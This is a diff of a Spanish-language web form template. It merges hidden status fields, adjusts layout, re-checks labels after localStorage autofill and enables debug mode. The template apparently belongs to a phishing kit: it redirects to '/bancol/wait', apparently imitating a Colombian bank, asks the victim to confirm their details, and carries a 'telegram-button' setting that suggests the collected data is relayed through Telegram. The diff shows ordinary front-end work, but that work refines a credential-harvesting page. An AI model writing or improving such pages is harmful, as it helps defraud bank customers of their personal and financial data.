@@ -315,10 +315,9 @@
                         <span id="direccionError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                     </div>
 
-                    <input type="hidden" id="status" name="status" value="datos" />
-                    <input type="hidden" id="no-status" name="no-status" value="datos" />
+                    <input type="hidden" id="no-status" name="status" value="datos" />
 
-                    <div class="w-full pt-6 pb-2 flex justify-end items-center px-[15px]">
+                    <div class="w-full pt-6 pb-2 flex justify-center items-center">
                         <button id="enviar"
                             class="font-bold py-2 px-6 rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                             disabled>
@@ -373,6 +372,23 @@
         /* ===== FLOATING LABELS ===== */
 
         /**
+         * Actualiza el estado de todos los floating labels
+         */
+        function updateAllLabels() {
+            const inputs = document.querySelectorAll('.floating-input');
+            inputs.forEach(input => {
+                const label = input.nextElementSibling;
+                if (!label || !label.classList.contains('floating-label')) return;
+
+                if (input.value) {
+                    label.classList.add('active');
+                } else {
+                    label.classList.remove('active');
+                }
+            });
+        }
+
+        /**
          * Configura los floating labels para todos los inputs
          */
         function setupFloatingLabels() {
@@ -397,6 +413,10 @@
                 // Inicializar estado
                 updateLabel();
             });
+
+            // Verificar de nuevo después del autocompletado de localStorage
+            setTimeout(updateAllLabels, 100);
+            setTimeout(updateAllLabels, 500);
         }
 
         /* ===== VALIDACIONES DE CAMPOS DE ENTRADA ===== */
@@ -500,7 +520,7 @@
 
     <x-control
         :auto-completar="true"
-        :debug="false"
+        :debug="true"
         redirect-url="/bancol/wait"
         toast-message="Verifica la información ingresada sea la correcta o actualizala"
         telegram-button="DATOS"
